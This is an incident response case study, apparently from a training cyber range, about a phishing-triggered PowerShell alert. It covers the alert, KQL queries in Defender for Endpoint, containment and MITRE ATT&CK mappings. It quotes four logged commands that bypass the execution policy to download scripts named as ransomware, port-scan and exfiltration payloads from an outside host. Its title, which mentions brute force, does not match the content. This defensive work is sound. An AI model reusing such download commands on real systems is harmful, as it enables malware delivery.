# Incident Response Mini-Case: Azure VM Brute Force Attempts

## Executive Summary


---

## Scenario / Context

SOC team on 19-11-2025, 16:31 got an alert of `High` severity - one of users invoked "powershell.exe" process containing "Invoke-WebRequest" 4 times. 

Initial reconaissance - the user downloaded different 4 different files, and packed them in hidden folders.

I took the alert as mine and set the incidents status to `Active`.

---

## Tools & Data Sources

- Microsoft Sentinel,
- Microsoft Defender for Endpoint (MDE),
- Kusto Query Language (KQL).
---

## Detection & Triage

The commands that fired the incident were all run on one machine by one user.

The 4 different scripts were downloaded with 4 different commands:

`"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`

`"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`

`"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`

`"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1`

> I will not paste the contents of the scripts here, but you can look them up yourself by pasting the link from the commands (it's nothing actually harmful, so no worries).

---

## Investigation Steps

First, I passed the scripts off to the malware reverse engineering team, so they can give me an idea of what the scripts could actually do or did.

I contacted the user to ask what they were doing on their PC around the time of the logs being generated (their role does not require downloading anything from the Internet).

They said they tried to install a free piece of software from an email they got from one of our vendors (yeah, right...). A black screen appeared for a few seconds, and then "nothing happened" afterwards.

I ran a query on Microsoft Defender for Endpoint (MDE) to determine whether the downloaded scripts were actually run:

```kql
let TargetHostname = "vm-bartek";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by Timestamp
| project Timestamp, AccountName, DeviceName, FileName, ProcessCommandLine
```

![Screenshot of the actual query and its results]

As it turned out - the scripts were run.

Right after that the malware reverse engineering team sent me back their results. In summary:

- pwnscrypt.ps1 - generates some data of fake employees, encrypts them and leaves a message - a txt file - on the desktop, demanding a ransom,
- eicar.ps1 - generates a well known test file to test virus detecting capabilities of software (most commonly AV),
- exfiltratedata.ps1 - generates fake data of employees, silently downloads Zip7, zips up the fake file, and stores it in a hidden location,
- portscan.ps1 - scans well known ports from the inside.

_Important!_ - none of the scripts sent anything to anyone, so it was one step before getting to a C2 phase. Nevertheless - if the attacked got access to the machine once again - the files were ready there. And of course - the files were just generating fake info for the files, but in real life scenario it COULD be a real information.

> I won't go into too much detail about every script here, because I will be doing seperate threat hunts, analyzing every script in much more detail.

---

## Containment & Eradication

I Isolated the machine in the MDE and ran an anti-virus scan.

After the machine came back clean, we removed it from the isolation.

## Lessons Learned & Recommendations

- We had the affected user go through extra rounds of cybersecurity awareness training and upgraded our training packege from KnowBe4,
- We sent the phishing email to our security engineering team, so they can tune up our phishing detection software,
- We started the implementation of a policy that restricts use of PowerShell for non-essential users.

## MITRE ATT&CK

- T1566.001 (Phishing: Spearphishing Attachment) - an attacker got our employee to click a malicious, spearphishing attachment (they knew exactly what our vendor was and to who exactly send the email)
- T1059.001 (Command and Scripting Interpreter: PowerShell) - they used PowerShell scripts to execute the malicious code
- T1564.001 (Hide Artifacts: Hidden Files and Directories) - generated files were hidden in normally invisible directory
- T1560 (Archive Collected Data) - some of the generated data got archived
- T1119 (Automated Collection) - the scripts COULD automatically gather sensitive data in real life scenario (but here the data was mostly generated by the script)
- 
- 
